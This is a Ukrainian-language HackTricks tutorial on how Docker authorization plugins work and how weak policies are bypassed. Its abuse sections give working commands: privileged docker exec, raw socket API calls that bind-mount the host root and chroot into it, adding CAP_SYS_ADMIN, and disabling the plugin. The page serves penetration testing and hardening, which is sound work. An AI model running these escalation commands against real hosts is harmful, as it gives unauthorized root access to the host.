# Плагіни авторизації під час виконання

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Плагіни авторизації під час виконання — це додатковий рівень політик, який визначає, чи може клієнт виконати певну дію демона. Класичний приклад — Docker. За замовчуванням кожен, хто може взаємодіяти з демоном Docker, фактично має широкий контроль над ним. Плагіни авторизації намагаються обмежити цю модель: аналізують автентифікованого користувача та запитану операцію API, а потім дозволяють або відхиляють запит відповідно до політики.

Ця тема заслуговує на окрему сторінку, оскільки змінює модель експлуатації, якщо зловмисник уже має доступ до Docker API або є користувачем групи `docker`. У таких середовищах питання вже не лише в тому, «чи можу я зв’язатися з демоном?», а й у тому, «чи обмежує демон рівень авторизації, і якщо так, чи можна його обійти через необроблені кінцеві точки, слабкий розбір JSON або права на керування плагінами?»

## Робота

Коли запит надходить до демона Docker, підсистема авторизації може передати контекст запиту одному чи кільком встановленим плагінам. Плагін бачить ідентифікаційні дані автентифікованого користувача, відомості про запит, вибрані заголовки та частини тіла запиту або відповіді, якщо це дозволяє тип вмісту. Кілька плагінів можна об’єднати в ланцюжок, і доступ надається, лише якщо всі плагіни дозволяють запит.

Ця модель здається надійною, але її безпека повністю залежить від того, наскільки добре автор політики розуміє API. Плагін, який блокує `docker run --privileged`, але ігнорує `docker exec`, пропускає альтернативні ключі JSON, як-от `Binds` на верхньому рівні, або дозволяє керувати плагінами, може створити хибне відчуття обмежень, водночас залишаючи відкритими прямі шляхи підвищення привілеїв.

## Типові цілі для плагінів

Важливі ділянки для перевірки політики:

- кінцеві точки створення контейнерів
- поля `HostConfig`, як-от `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` і параметри спільного використання просторів імен
- поведінка `docker exec`
- кінцеві точки керування плагінами
- будь-які кінцеві точки, які можуть опосередковано запускати дії середовища виконання поза межами передбаченої моделлю політики

Історично приклади на кшталт плагіна `authz` від Twistlock і простих навчальних плагінів, таких як `authobot`, полегшували вивчення цієї моделі, оскільки їхні файли політик і шляхи виконання коду демонстрували, як саме реалізовано зіставлення кінцевих точок із діями. Для оцінювання важливо розуміти, що автор політики має знати всю поверхню API, а не лише найпомітніші команди CLI.

## Зловживання

Насамперед потрібно з’ясувати, що саме заблоковано. Якщо демон відхиляє дію, повідомлення про помилку часто leak-ить назву плагіна, що допомагає визначити задіяний механізм контролю:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Якщо потрібне ширше профілювання кінцевих точок, стануть у пригоді такі інструменти, як `docker_auth_profiler`, адже вони автоматизують інакше повторювану перевірку того, які маршрути API та структури JSON справді дозволені плагіном.

Якщо в середовищі використовується власний плагін і ви можете взаємодіяти з API, визначте, які поля об’єктів справді фільтруються:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Ці перевірки важливі, оскільки багато помилок авторизації стосуються конкретних полів, а не концепцій загалом. Плагін може відхилити шаблон CLI, але не повністю блокувати еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політику, яка блокує створення привілейованих контейнерів, але дозволяє створення контейнерів без обмежень разом із `docker exec`, усе ще можна обійти:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Якщо daemon приймає другий крок, користувач отримує привілейований інтерактивний процес усередині контейнера, який автор політики вважав обмеженим.

Обмежене правило `sudo` може відкрити той самий шлях, навіть якщо користувач не має прямого доступу до сокета Docker. Наприклад, дозвіл root-capable на `/usr/bin/docker exec *` може дозволити користувачу передати параметри Docker `--privileged` і `--user root`. Для цього все одно потрібен запущений контейнер; на деяких хостах Linux його ID видно в командному рядку процесу `containerd-shim`, коли `docker ps` заборонено. Розглядайте це правило як підказку для перевірки: з’ясуйте фактичну політику sudo, засоби авторизації daemon, налаштування user namespaces і те, чи може отриманий процес отримати доступ до пристрою хоста або доступного для запису змонтованого ресурсу хоста. Docker описує параметри exec у своїй [довідці CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Обгортка, що запускається від root і приймає вибраний користувачем файл Compose, має перевіряти всю [модель сервісів Compose](https://docs.docker.com/reference/compose-file/services/), а не лише відхиляти `privileged: true` і вимагати `:ro` для bind mounts. Перевірте `cap_add`, `security_opt`, пристрої, namespaces, вхідні дані для збирання та всі підтримувані синтаксичні форми volumes. Bind mount лише для читання все одно може стати доступним для запису з контейнера з відповідними capabilities і послабленими обмеженнями безпеки — залежно від політик daemon і ядра. Також потрібно перевірити списки дозволених шляхів хоста, що спираються лише на префікс, і перевірки symlink для останнього компонента шляху. Правило sudo та буквальний виклик `docker-compose up` вказують на потенційну проблему; чи можна її експлуатувати, залежить від фактичної перевірки обгорткою та обмежень daemon під час виконання.

### Повний приклад: bind mount через Raw API

Деякі недосконалі політики перевіряють лише одну форму JSON. Якщо bind mount кореневої файлової системи не блокується послідовно, хост усе ще можна змонтувати:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Та сама ідея може також бути присутня в `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Наслідком є повний вихід із контейнера до файлової системи хоста. Цікаво, що обхід стає можливим через неповне охоплення політикою, а не через помилку ядра.

### Повний приклад: неперевірений атрибут capability

Якщо політика забуває фільтрувати атрибут, пов’язаний із capability, зловмисник може створити контейнер, який знову отримує небезпечну capability:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Щойно з’являється `CAP_SYS_ADMIN` або подібна потужна capability, стають доступними багато технік виходу з контейнера, описаних у [capabilities.md](protections/capabilities.md) і [privileged-containers.md](privileged-containers.md).

### Повний приклад: вимкнення плагіна

Якщо дозволені операції керування плагінами, найпростіший обхід може полягати в тому, щоб повністю вимкнути контроль:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Це збій політики на рівні control-plane. Рівень авторизації існує, але користувач, якого він мав обмежувати, усе ще має дозвіл вимкнути його.

## Перевірки

Ці команди призначені для визначення того, чи існує рівень політик і чи є він повноцінним, а не поверхневим.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Що тут цікавого:

- Повідомлення про відмову, що містять назву плагіна, підтверджують наявність рівня авторизації та часто розкривають точну реалізацію.
- Списку плагінів, видимого зловмиснику, може бути достатньо, щоб з’ясувати, чи можливі операції вимкнення або переналаштування.
- Політику, яка блокує лише очевидні дії CLI, але не прямі запити до API, слід вважати обхідною, доки не доведено протилежне.

## Стандартні налаштування середовищ виконання

| Середовище виконання / платформа | Стандартний стан | Стандартна поведінка | Типове ручне послаблення захисту |
| --- | --- | --- | --- |
| Docker Engine | Стандартно не ввімкнено | Доступ до демона фактично або повний, або відсутній, якщо не налаштовано плагін авторизації | неповна політика плагіна, чорні списки замість списків дозволів, дозвіл на керування плагінами, сліпі зони на рівні полів |
| Podman | Немає поширеного прямого еквівалента | Podman зазвичай більше покладається на дозволи Unix, rootless-виконання та рішення щодо відкриття API, ніж на плагіни авторизації на кшталт Docker | широке відкриття API rootful Podman, слабкі дозволи сокета |
| containerd / CRI-O | Інша модель контролю | Ці середовища виконання зазвичай покладаються на дозволи сокетів, межі довіри вузлів і засоби контролю оркестратора вищого рівня, а не на плагіни авторизації Docker | монтування сокета у робочі навантаження, слабкі припущення щодо локальної довіри до вузла |
| Kubernetes | Використовує автентифікацію й авторизацію на рівнях API-сервера та kubelet, а не плагіни авторизації Docker | Основним рівнем політик є RBAC кластера та контроль допуску | надто широкі дозволи RBAC, слабка політика контролю допуску, пряме відкриття API kubelet або середовища виконання |
